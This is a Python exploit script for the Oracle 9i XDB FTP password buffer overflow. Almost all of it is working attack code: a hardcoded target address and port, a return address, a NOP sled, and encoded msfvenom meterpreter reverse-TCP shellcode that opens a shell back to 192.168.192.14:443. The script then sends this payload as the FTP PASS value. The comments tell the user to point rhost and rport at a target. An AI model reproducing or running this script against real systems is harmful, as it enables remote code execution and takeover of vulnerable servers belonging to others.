#!/usr/bin/python
## oracle_xdb_ftp_pass-exploit.py
##
## Exploits Oracle 9i XDB ftp password buffer overflow vulnerability
##   -> http://www.blackhat.com/presentations/bh-usa-03/bh-us-03-litchfield-paper.pdf
##
## Spawns a reverse meterpreter shell to 192.168.192.14:443
##
## Author Re4son <re4son [at] whitedome.com.au
##
## TODO: adjust 
##		- rhost to point to the right target
##		- rport to use the right port
##
## Execution: python oracle_xdb_ftp_pass-exploit.py

import sys, socket, random, string


rhost = "192.168.104.13" 		# Target IP address
rport = 2100				# Target Port, can be 135, 137, 445


## Return addresses according to metasploit:
##
##   0x60616d46		oraclient9.dll (pop/pop/ret)



ret = "\x46\x6d\x61\x60"			## Return address (Little Endian)



nops = "\x90" *(800-308-7)			## to fill 800

prependencoder = "\x81\xc4\xff\xef\xff\xff\x44"	## following the NOP sled, but before the decoder machine code


## Max space for shell code = 800
## Bad characters according to metasploit: \x00\x09\x0a\x0d\x20\x22\x25\x26\x27\x2b\x2f\x3a\x3c\x3e\x3f\x40
## Shellcode via: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.192.14 LPORT=443 EXITFUNC=thread -a x86 --platform Windows  -b \x00\x09\x0a\x0d\x20\x22\x25\x26\x27\x2b\x2f\x3a\x3c\x3e\x3f\x40 -f python -v shellcode
## x86/call4_dword_xor succeeded with size 308 (iteration=0)


shellcode =  ""
shellcode += nops
shellcode += prependencoder
shellcode += "\x29\xc9\x83\xe9\xb9\xe8\xff\xff\xff\xff\xc0\x5e"
shellcode += "\x81\x76\x0e\x8e\x9d\x91\xba\x83\xee\xfc\xe2\xf4"
shellcode += "\x72\x75\x13\xba\x8e\x9d\xf1\x33\x6b\xac\x51\xde"
shellcode += "\x05\xcd\xa1\x31\xdc\x91\x1a\xe8\x9a\x16\xe3\x92"
shellcode += "\x81\x2a\xdb\x9c\xbf\x62\x3d\x86\xef\xe1\x93\x96"
shellcode += "\xae\x5c\x5e\xb7\x8f\x5a\x73\x48\xdc\xca\x1a\xe8"
shellcode += "\x9e\x16\xdb\x86\x05\xd1\x80\xc2\x6d\xd5\x90\x6b"
shellcode += "\xdf\x16\xc8\x9a\x8f\x4e\x1a\xf3\x96\x7e\xab\xf3"
shellcode += "\x05\xa9\x1a\xbb\x58\xac\x6e\x16\x4f\x52\x9c\xbb"
shellcode += "\x49\xa5\x71\xcf\x78\x9e\xec\x42\xb5\xe0\xb5\xcf"
shellcode += "\x6a\xc5\x1a\xe2\xaa\x9c\x42\xdc\x05\x91\xda\x31"
shellcode += "\xd6\x81\x90\x69\x05\x99\x1a\xbb\x5e\x14\xd5\x9e"
shellcode += "\xaa\xc6\xca\xdb\xd7\xc7\xc0\x45\x6e\xc2\xce\xe0"
shellcode += "\x05\x8f\x7a\x37\xd3\xf5\xa2\x88\x8e\x9d\xf9\xcd"
shellcode += "\xfd\xaf\xce\xee\xe6\xd1\xe6\x9c\x89\x62\x44\x02"
shellcode += "\x1e\x9c\x91\xba\xa7\x59\xc5\xea\xe6\xb4\x11\xd1"
shellcode += "\x8e\x62\x44\xea\xde\xcd\xc1\xfa\xde\xdd\xc1\xd2"
shellcode += "\x64\x92\x4e\x5a\x71\x48\x06\xd0\x8b\xf5\x51\x12"
shellcode += "\x82\x58\xf9\xb8\x8e\x9c\x2a\x33\x68\xf7\x81\xec"
shellcode += "\xd9\xf5\x08\x1f\xfa\xfc\x6e\x6f\x0b\x5d\xe5\xb6"
shellcode += "\x71\xd3\x99\xcf\x62\xf5\x61\x0f\x2c\xcb\x6e\x6f"
shellcode += "\xe4\x9d\xfb\xbe\xd8\xca\xf9\xb8\x57\x55\xce\x45"
shellcode += "\x5b\x16\xa7\xd0\xce\xf5\x91\xaa\x8e\x9d\xc7\xd0"
shellcode += "\x8e\xf5\xc9\x1e\xdd\x78\x6e\x6f\x1d\xce\xfb\xba"
shellcode += "\xd8\xce\xc6\xd2\x8c\x44\x59\xe5\x71\x48\x90\x79"
shellcode += "\xa7\x5b\xe4\x54\x4d\x9d\x91\xba"





user = "".join( [random.choice(string.uppercase) for i in xrange(10)] )				## 10 random uppercase characters

passwd = "".join( [random.choice(string.uppercase) for i in xrange(442)] )			## 442 random uppercase characters
jmp_short = "\xEB\x06"										## Short jump (\xEB) to an offset of 6 (\x06) according to metasploit (Rex::Arch::X86.jmp_short(6))		
two_nops  = "\x90\x90"										## Two NOP's


## Let's build the exploit that is send as password

buffer = passwd + jmp_short + two_nops + ret + shellcode


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	print "\nConnecting..."
	s.connect((rhost,rport))
	data = s.recv(1024)
	s.send('USER' + user +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\nDone!"
	s.close
except:
	print "Could not connect to " + rhost + ":" + str(rport) + "!"

